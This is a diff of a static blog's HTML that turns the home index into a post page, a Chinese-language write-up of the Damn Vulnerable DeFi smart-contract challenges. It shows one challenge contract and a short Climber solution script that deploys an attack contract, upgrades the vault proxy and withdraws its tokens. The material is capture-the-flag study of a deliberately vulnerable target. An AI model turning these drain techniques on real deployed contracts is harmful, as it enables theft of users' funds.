@@ -19,23 +19,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="scw&#39;s Blog">
-<meta property="og:url" content="http://example.com/index.html">
+    <meta name="description" content="Challenge #1 - UnstoppableThere’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop off">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Damn Vulnerable DeFi(未完待续)">
+<meta property="og:url" content="http://example.com/2023/11/12/DamnVulnerableDeFi/index.html">
 <meta property="og:site_name" content="scw&#39;s Blog">
+<meta property="og:description" content="Challenge #1 - UnstoppableThere’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop off">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-11-12T06:58:09.000Z">
+<meta property="article:modified_time" content="2023-12-07T13:34:51.339Z">
 <meta property="article:author" content="scw">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2023/11/12/DamnVulnerableDeFi/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/11/12/DamnVulnerableDeFi/","path":"2023/11/12/DamnVulnerableDeFi/","title":"Damn Vulnerable DeFi(未完待续)"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>scw's Blog</title>
+<title>Damn Vulnerable DeFi(未完待续) | scw's Blog</title>
   
 
 
@@ -68,7 +72,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">scw's Blog</h1>
+      <p class="site-title">scw's Blog</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -94,7 +98,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -107,6 +111,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-1-Unstoppable"><span class="nav-number">1.</span> <span class="nav-text">Challenge #1 - Unstoppable</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code"><span class="nav-number">1.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ReceiverUnstoppable-sol"><span class="nav-number">1.1.1.</span> <span class="nav-text">ReceiverUnstoppable.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UnstoppableVault-sol"><span class="nav-number">1.1.2.</span> <span class="nav-text">UnstoppableVault.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack"><span class="nav-number">1.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-2-Naive-receiver"><span class="nav-number">2.</span> <span class="nav-text">Challenge #2 - Naive receiver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-1"><span class="nav-number">2.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FlashLoanReceiver-sol"><span class="nav-number">2.1.1.</span> <span class="nav-text">FlashLoanReceiver.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NaiveReceiverLenderPool-sol"><span class="nav-number">2.1.2.</span> <span class="nav-text">NaiveReceiverLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-1"><span class="nav-number">2.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-3-Truster"><span class="nav-number">3.</span> <span class="nav-text">Challenge #3 - Truster</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-2"><span class="nav-number">3.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TrusterLenderPool-sol"><span class="nav-number">3.1.1.</span> <span class="nav-text">TrusterLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-2"><span class="nav-number">3.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-4-Side-Entrance"><span class="nav-number">4.</span> <span class="nav-text">Challenge #4 - Side Entrance</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-3"><span class="nav-number">4.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SideEntranceLenderPool-sol"><span class="nav-number">4.1.1.</span> <span class="nav-text">SideEntranceLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-3"><span class="nav-number">4.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SideEntranceLenderPoolAttack-sol"><span class="nav-number">4.3.1.</span> <span class="nav-text">SideEntranceLenderPoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js"><span class="nav-number">4.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-5-The-Rewarder"><span class="nav-number">5.</span> <span class="nav-text">Challenge #5 - The Rewarder</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-4"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#AccountingToken-sol"><span class="nav-number">5.1.1.</span> <span class="nav-text">AccountingToken.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FlashLoanerPool-sol"><span class="nav-number">5.1.2.</span> <span class="nav-text">FlashLoanerPool.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RewardToken-sol"><span class="nav-number">5.1.3.</span> <span class="nav-text">RewardToken.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TheRewarderPool-sol"><span class="nav-number">5.1.4.</span> <span class="nav-text">TheRewarderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-4"><span class="nav-number">5.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-4"><span class="nav-number">5.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TheRewarderPoolAttack-sol"><span class="nav-number">5.3.1.</span> <span class="nav-text">TheRewarderPoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-1"><span class="nav-number">5.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-6-Selfie"><span class="nav-number">6.</span> <span class="nav-text">Challenge #6 - Selfie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-5"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ISimpleGovernance-sol"><span class="nav-number">6.1.1.</span> <span class="nav-text">ISimpleGovernance.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SimpleGovernance-sol"><span class="nav-number">6.1.2.</span> <span class="nav-text">SimpleGovernance.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SelfiePool-sol"><span class="nav-number">6.1.3.</span> <span class="nav-text">SelfiePool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-5"><span class="nav-number">6.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-5"><span class="nav-number">6.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SelfiePoolAttack-sol"><span class="nav-number">6.3.1.</span> <span class="nav-text">SelfiePoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-2"><span class="nav-number">6.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-7-Compromised"><span class="nav-number">7.</span> <span class="nav-text">Challenge #7 - Compromised</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-6"><span class="nav-number">7.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TrustfulOracle-sol"><span class="nav-number">7.1.1.</span> <span class="nav-text">TrustfulOracle.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TrustfulOracleInitializer-sol"><span class="nav-number">7.1.2.</span> <span class="nav-text">TrustfulOracleInitializer.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Exchange-sol"><span class="nav-number">7.1.3.</span> <span class="nav-text">Exchange.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-6"><span class="nav-number">7.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-6"><span class="nav-number">7.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-3"><span class="nav-number">7.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-8-Puppet"><span class="nav-number">8.</span> <span class="nav-text">Challenge #8 - Puppet</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-7"><span class="nav-number">8.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PuppetPool-sol"><span class="nav-number">8.1.1.</span> <span class="nav-text">PuppetPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-7"><span class="nav-number">8.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-7"><span class="nav-number">8.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-4"><span class="nav-number">8.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-9-Puppet-V2"><span class="nav-number">9.</span> <span class="nav-text">Challenge #9 - Puppet V2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-8"><span class="nav-number">9.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PuppetV2Pool-sol"><span class="nav-number">9.1.1.</span> <span class="nav-text">PuppetV2Pool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-8"><span class="nav-number">9.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-8"><span class="nav-number">9.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-5"><span class="nav-number">9.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-10-Free-Rider"><span class="nav-number">10.</span> <span class="nav-text">Challenge #10 - Free Rider</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-9"><span class="nav-number">10.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderRecovery-sol"><span class="nav-number">10.1.1.</span> <span class="nav-text">FreeRiderRecovery.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderNFTMarketplace-sol"><span class="nav-number">10.1.2.</span> <span class="nav-text">FreeRiderNFTMarketplace.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-9"><span class="nav-number">10.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-9"><span class="nav-number">10.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderNFTMarketplaceAttack-sol"><span class="nav-number">10.3.1.</span> <span class="nav-text">FreeRiderNFTMarketplaceAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-6"><span class="nav-number">10.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-11-Backdoor"><span class="nav-number">11.</span> <span class="nav-text">Challenge #11 - Backdoor</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-10"><span class="nav-number">11.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistry-sol"><span class="nav-number">11.1.1.</span> <span class="nav-text">WalletRegistry.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-10"><span class="nav-number">11.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-10"><span class="nav-number">11.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistryAttack-sol"><span class="nav-number">11.3.1.</span> <span class="nav-text">WalletRegistryAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistryAttack2-sol"><span class="nav-number">11.3.2.</span> <span class="nav-text">WalletRegistryAttack2.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-7"><span class="nav-number">11.3.3.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-12-Climber"><span class="nav-number">12.</span> <span class="nav-text">Challenge #12 - Climber</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-11"><span class="nav-number">12.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberConstants-sol"><span class="nav-number">12.1.1.</span> <span class="nav-text">ClimberConstants.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberErrors-sol"><span class="nav-number">12.1.2.</span> <span class="nav-text">ClimberErrors.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberTimelock-sol"><span class="nav-number">12.1.3.</span> <span class="nav-text">ClimberTimelock.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberTimelockBase-sol"><span class="nav-number">12.1.4.</span> <span class="nav-text">ClimberTimelockBase.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberVault-sol"><span class="nav-number">12.1.5.</span> <span class="nav-text">ClimberVault.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-11"><span class="nav-number">12.2.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberVaultAttack-sol"><span class="nav-number">12.2.1.</span> <span class="nav-text">ClimberVaultAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-8"><span class="nav-number">12.2.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -136,16 +141,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/12/DamnVulnerableDeFi/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -159,13 +165,13 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | scw's Blog">
+      <meta itemprop="name" content="Damn Vulnerable DeFi(未完待续) | scw's Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/11/12/DamnVulnerableDeFi/" class="post-title-link" itemprop="url">Damn Vulnerable DeFi(未完待续)</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Damn Vulnerable DeFi(未完待续)
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -194,8 +200,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="Challenge-1-Unstoppable"><a href="#Challenge-1-Unstoppable" class="headerlink" title="Challenge #1 - Unstoppable"></a>Challenge #1 - Unstoppable</h3><p>There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</p>
+    <div class="post-body" itemprop="articleBody"><h3 id="Challenge-1-Unstoppable"><a href="#Challenge-1-Unstoppable" class="headerlink" title="Challenge #1 - Unstoppable"></a>Challenge #1 - Unstoppable</h3><p>There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</p>
 <p>To pass the challenge, make the vault stop offering flash loans.</p>
 <p>You start with 10 DVT tokens in balance.</p>
 <h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><h5 id="ReceiverUnstoppable-sol"><a href="#ReceiverUnstoppable-sol" class="headerlink" title="ReceiverUnstoppable.sol"></a>ReceiverUnstoppable.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;solmate/src/auth/Owned.sol&quot;;</span><br><span class="line">import &#123; UnstoppableVault, ERC20 &#125; from &quot;../unstoppable/UnstoppableVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ReceiverUnstoppable</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower &#123;</span><br><span class="line">    UnstoppableVault private immutable pool;</span><br><span class="line"></span><br><span class="line">    error UnexpectedFlashLoan();</span><br><span class="line"></span><br><span class="line">    constructor(address poolAddress) Owned(msg.sender) &#123;</span><br><span class="line">        pool = UnstoppableVault(poolAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 fee,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external returns (bytes32) &#123;</span><br><span class="line">        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)</span><br><span class="line">            revert UnexpectedFlashLoan();</span><br><span class="line"></span><br><span class="line">        ERC20(token).approve(address(pool), amount);</span><br><span class="line"></span><br><span class="line">        return keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeFlashLoan(uint256 amount) external onlyOwner &#123;</span><br><span class="line">        address asset = address(pool.asset());</span><br><span class="line">        pool.flashLoan(</span><br><span class="line">            this,</span><br><span class="line">            asset,</span><br><span class="line">            amount,</span><br><span class="line">            bytes(&quot;&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -376,7 +381,6 @@
 <h5 id="js-8"><a href="#js-8" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Attack</span> = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;ClimberVaultAttack&#x27;</span> , player)).<span class="title function_">deploy</span>(timelock.<span class="property">address</span>,vault.<span class="property">address</span>,player.<span class="property">address</span>,token.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">Attack</span>.<span class="title function_">connect</span>(player).<span class="title function_">executeattack</span>();</span><br><span class="line">    </span><br><span class="line">        upgradedClimberVault = <span class="keyword">await</span> upgrades.<span class="title function_">upgradeProxy</span>(</span><br><span class="line">            vault.<span class="property">address</span>, </span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;ClimberVaultAttackUpgrade&quot;</span>, player));</span><br><span class="line">        <span class="keyword">await</span> upgradedClimberVault.<span class="title function_">connect</span>(player).<span class="title function_">withdraw</span>(token.<span class="property">address</span>);</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
@@ -384,343 +388,22 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
 
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/08/Metatrust%202023ctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="scw">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/11/08/Metatrust%202023ctf/" class="post-title-link" itemprop="url">Metatrust CTF</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-11-08 23:00:42" itemprop="dateCreated datePublished" datetime="2023-11-08T23:00:42+08:00">2023-11-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-06 01:06:36" itemprop="dateModified" datetime="2023-12-06T01:06:36+08:00">2023-12-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="一-greeterVault"><a href="#一-greeterVault" class="headerlink" title="一.greeterVault"></a>一.greeterVault</h3>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/11/08/Metatrust%202023ctf/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/11/Solidity%20%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="scw">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/10/11/Solidity%20%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Solidity 基础漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-10-11 00:42:45" itemprop="dateCreated datePublished" datetime="2023-10-11T00:42:45+08:00">2023-10-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-05 00:58:51" itemprop="dateModified" datetime="2023-11-05T00:58:51+08:00">2023-11-05</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/10/11/Solidity%20%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/08/Metatrust%202023ctf/" rel="prev" title="Metatrust CTF">
+                  <i class="fa fa-angle-left"></i> Metatrust CTF
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/15/Capture%20The%20Ether/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="scw">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scw's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
